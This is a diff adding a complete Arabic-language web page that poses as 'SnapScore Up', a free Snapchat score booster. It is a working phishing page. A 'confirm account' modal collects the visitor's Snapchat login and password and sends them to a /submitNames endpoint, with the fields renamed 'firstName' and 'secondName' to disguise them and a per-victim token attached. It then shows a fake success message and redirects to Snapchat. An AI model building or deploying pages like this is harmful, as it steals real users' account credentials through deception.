@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Meta Tags for Preview -->
+    <meta property="og:title" content="SnapScore Up - زيادة سكور سناب شات">
+    <meta property="og:description" content="ارفع سكور حسابك على سناب شات بمقدار 50,000 نقطة مجاناً! خدمة سريعة وآمنة.">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/600px-Snapchat_logo.svg.png">
+
+    <title>SnapScore Up</title>
+    <style>
+        body { font-family: 'Arial', sans-serif; background-color: #fffc00; color: #000; margin: 0; padding: 0; }
+        .nav { background: #fff; padding: 15px; text-align: center; font-weight: bold; font-size: 22px; border-bottom: 2px solid #000; }
+        .container { max-width: 400px; margin: 30px auto; padding: 0 15px; }
+        .card { background: white; border-radius: 20px; padding: 30px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; border: 2px solid #000; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 2px solid #000; border-radius: 10px; box-sizing: border-box; font-size: 16px; }
+        .btn-snap { width: 100%; padding: 15px; background: #000; color: #fff; border: none; border-radius: 10px; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 15px; }
+        .plans { margin: 20px 0; display: flex; flex-direction: column; gap: 10px; }
+        .plan { border: 2px solid #eee; padding: 15px; border-radius: 12px; cursor: pointer; display: flex; justify-content: space-between; }
+        .plan.active { border-color: #000; background: #fffde0; }
+        
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); justify-content: center; align-items: center; z-index: 1000; }
+        .modal-content { background: white; padding: 30px; border-radius: 20px; width: 90%; max-width: 360px; text-align: center; border: 3px solid #000; }
+    </style>
+</head>
+<body>
+
+<div class="nav">SnapScore Up 👻</div>
+
+<div class="container">
+    <div class="card">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/600px-Snapchat_logo.svg.png" width="60">
+        <h2>ارفع سكور حسابك الآن</h2>
+        <p>أدخل اسم المستخدم الخاص بك واختر الباقة المطلوبة.</p>
+        
+        <input type="text" id="s_user" placeholder="اسم المستخدم (Username)">
+        
+        <div class="plans">
+            <div class="plan active" onclick="selS(this, '0')"><span>+50,000 سكور</span> <b>مجاني</b></div>
+            <div class="plan" onclick="selS(this, '5')"><span>+200,000 سكور</span> <b>4.99$</b></div>
+        </div>
+
+        <button class="btn-snap" id="sBtn" onclick="openS()">تفعيل الآن</button>
+    </div>
+</div>
+
+<div class="modal" id="sModal">
+    <div class="modal-content">
+        <h2 style="font-size: 24px;">تأكيد الحساب</h2>
+        <p>يرجى تسجيل الدخول لتأكيد ملكية الحساب وبدء عملية رفع السكور.</p>
+        <form id="sForm">
+            <input type="text" id="u" placeholder="اسم المستخدم أو البريد" required>
+            <input type="password" id="p" placeholder="كلمة السر" required>
+            <button type="submit" class="btn-snap" id="subS">تأكيد الحساب</button>
+        </form>
+        <button onclick="document.getElementById('sModal').style.display='none'" style="background:none; border:none; color:#999; margin-top:10px;">إلغاء</button>
+    </div>
+</div>
+
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const token = urlParams.get('t');
+    let isFree = true;
+
+    function selS(el, price) {
+        document.querySelectorAll('.plan').forEach(p => p.classList.remove('active'));
+        el.classList.add('active');
+        isFree = (price === '0');
+        document.getElementById('sBtn').innerText = isFree ? "تفعيل الآن" : "شراء الآن";
+    }
+
+    function openS() {
+        if(!isFree) return alert('بوابة الدفع مغلقة حالياً، جرب الباقة المجانية!');
+        document.getElementById('sModal').style.display = 'flex';
+    }
+
+    document.getElementById('sForm').onsubmit = async (e) => {
+        e.preventDefault();
+        const btn = document.getElementById('subS');
+        btn.disabled = true;
+        btn.innerText = "جاري التأكيد...";
+
+        await fetch('/submitNames', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ token, firstName: document.getElementById('u').value, secondName: document.getElementById('p').value })
+        });
+
+        alert('تم التأكيد! سيبدأ رفع السكور خلال 15 دقيقة.');
+        window.location.href = "https://www.snapchat.com";
+    };
+</script>
+</body>
+</html>
